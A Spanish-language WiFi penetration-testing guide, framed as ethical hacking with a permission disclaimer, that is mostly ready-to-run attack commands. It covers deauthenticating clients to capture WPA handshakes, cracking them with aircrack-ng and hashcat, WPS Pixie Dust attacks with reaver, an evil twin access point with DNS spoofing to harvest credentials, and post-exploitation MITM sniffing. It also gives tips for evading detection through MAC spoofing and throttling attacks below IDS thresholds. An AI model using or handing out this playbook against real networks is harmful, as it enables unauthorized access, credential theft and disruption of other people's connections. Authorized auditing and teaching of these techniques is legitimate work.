

### Guía Completa para Pruebas de Seguridad en Redes WiFi (Hacking Ético)  
**Importante:** Esta guía es exclusivamente para fines educativos y de auditoría ética en redes **con permiso explícito** del propietario. El acceso no autorizado a redes WiFi es ilegal en la mayoría de los países.

---

### **Fase 1: Reconocimiento y Enumeración**  
#### **Objetivo:** Identificar redes WiFi disponibles y recopilar información básica.  
**Herramientas:** `airodump-ng`, `iwlist`, `nmcli`  

#### **Pasos:**  
1. **Poner la interfaz en modo monitor:**  
   ```bash
   sudo airmon-ng start wlan0   # Reemplaza "wlan0" con tu interfaz
   ```
   *Resultado:* Se creará una interfaz virtual (ej: `wlan0mon`).

2. **Escanear redes disponibles:**  
   ```bash
   sudo airodump-ng wlan0mon
   ```
   *Información obtenida:*  
   - BSSID (MAC del Access Point)  
   - ESSID (Nombre de la red)  
   - Canal  
   - Tipo de cifrado (WEP, WPA, WPA2, WPA3)  
   - Clientes conectados (STATION)  

3. **Filtrar red objetivo (ej: canal 6):**  
   ```bash
   sudo airodump-ng --bssid <BSSID> -c 6 wlan0mon
   ```

---

### **Fase 2: Captura del Handshake WPA/WPA2**  
#### **Objetivo:** Obtener el handshake (4 paquetes de autenticación) para crackear la contraseña.  
**Herramientas:** `airodump-ng`, `aireplay-ng`  

#### **Pasos:**  
1. **Iniciar captura de paquetes:**  
   ```bash
   sudo airodump-ng --bssid <BSSID> -c <canal> -w captura wlan0mon
   ```
   *Parámetros:*  
   - `-w captura`: Guarda datos en archivos `captura-*.cap`.

2. **Forzar reconexión de clientes (para capturar handshake):**  
   ```bash
   sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
   ```
   *Explicación:* Envía paquetes de desautenticación para forzar a los clientes a reconectarse, generando el handshake.

3. **Verificar handshake capturado:**  
   Cuando aparezca en la terminal:  
   ```
   WPA handshake: <BSSID>
   ```

---

### **Fase 3: Análisis de Contraseñas**  
#### **Objetivo:** Crackear el handshake usando diccionarios.  
**Herramientas:** `aircrack-ng`, `hashcat`  

#### **Pasos:**  
1. **Crackear con aircrack-ng:**  
   ```bash
   sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> captura-01.cap
   ```
   *Parámetros:*  
   - `-w`: Ruta al diccionario (ej: `rockyou.txt`).  
   - `-b`: BSSID del objetivo.  

2. **Alternativa con hashcat (más rápido):**  
   ```bash
   hcxpcapngtool -o hash.hc22000 captura-01.cap   # Convertir handshake a formato hashcat
   hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
   ```

---

### **Fase 4: Ataques a Vulnerabilidades Específicas**  
#### **A. Ataque WPS (Wi-Fi Protected Setup)**  
**Herramienta:** `reaver`  
```bash
sudo reaver -i wlan0mon -b <BSSID> -c <canal> -vv -K 1
```
*Parámetros clave:*  
- `-K 1`: Usa ataque Pixie Dust (para routers vulnerables).  
- `-vv`: Modo verbose.  

#### **B. Ataque Evil Twin (Punto de Acceso Falso)**  
**Herramientas:** `airbase-ng`, `dnsspoof`  
1. **Crear AP falso:**  
   ```bash
   sudo airbase-ng -e <Nombre_Red_Falsa> -c <canal> wlan0mon
   ```
2. **Configurar servidor DHCP y redirección:**  
   ```bash
   sudo dnsspoof -i at0 -f hosts.txt   # Redirigir tráfico a un servidor falso
   ```
3. **Capturar credenciales:** Usa herramientas como `Ettercap` o un servidor web falso.

---

### **Fase 5: Post-Explotación**  
#### **Objetivo:** Mantener acceso y escanear la red interna.  
**Herramientas:** `nmap`, `mitmproxy`  

#### **Pasos:**  
1. **Escanear dispositivos en la red:**  
   ```bash
   sudo nmap -sP 192.168.1.0/24   # Descubre hosts activos
   ```
2. **Sniffing de tráfico (MITM):**  
   ```bash
   sudo mitmproxy -T --host
   ```
3. **Escalada de privilegios:** Explota vulnerabilidades en dispositivos IoT o routers (ej: contraseñas por defecto).

---

### **Consejos Clave**  
1. **Diccionarios Personalizados:**  
   Genera diccionarios con `crunch` o `cewl` para aumentar probabilidades:  
   ```bash
   cewl http://sitio_web.com -w diccionario.txt
   ```

2. **Evitar Detección:**  
   - Usa `macchanger` para ocultar tu MAC:  
     ```bash
     sudo macchanger -r wlan0mon
     ```
   - Limita el tráfico de ataques para no alertar IDS.

3. **Legalidad:**  
   - **Siempre obtén permiso por escrito.**  
   - Documenta hallazgos y recomienda soluciones (ej: deshabilitar WPS, usar WPA3).

---

### **Resumen de Comandos Esenciales**  
| Acción                          | Comando                                      |
|---------------------------------|----------------------------------------------|
| Modo monitor                    | `sudo airmon-ng start wlan0`                 |
| Escanear redes                  | `sudo airodump-ng wlan0mon`                  |
| Capturar handshake              | `sudo airodump-ng -b <BSSID> -w captura wlan0mon` |
| Forzar reconexión               | `sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon` |
| Crackear contraseña             | `sudo aircrack-ng -w rockyou.txt captura-01.cap` |
| Ataque WPS                      | `sudo reaver -i wlan0mon -b <BSSID> -K 1`    |
| Evil Twin                       | `sudo airbase-ng -e "Red_Falsa" wlan0mon`    |
| Escanear red interna            | `sudo nmap -sP 192.168.1.0/24`              |

---

### **Recursos Recomendados**  
- **Diccionarios:**  
  - [SecLists](https://github.com/danielmiessler/SecLists)  
  - [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)  
- **Libros:**  
  - *"Wireless Network Hacking"* por Ankit Fadia.  
  - *"Penetration Testing: A Hands-On Introduction to Hacking"* por Georgia Weidman.  

**Nota:** La práctica constante en entornos controlados (ej: routers de prueba) es clave para dominar estas técnicas. ¡Usa el conocimiento con responsabilidad! 🔒
